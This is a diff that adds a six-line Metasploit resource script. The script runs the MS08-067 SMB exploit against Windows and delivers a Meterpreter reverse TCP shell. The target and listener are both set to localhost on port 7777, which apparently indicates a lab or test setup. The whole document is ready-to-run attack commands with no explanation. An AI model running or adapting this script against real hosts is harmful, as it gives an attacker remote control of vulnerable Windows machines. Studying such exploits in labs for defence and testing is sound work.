@@ -1,0 +1,6 @@
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 127.0.0.1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 7777
+exploit -j -z
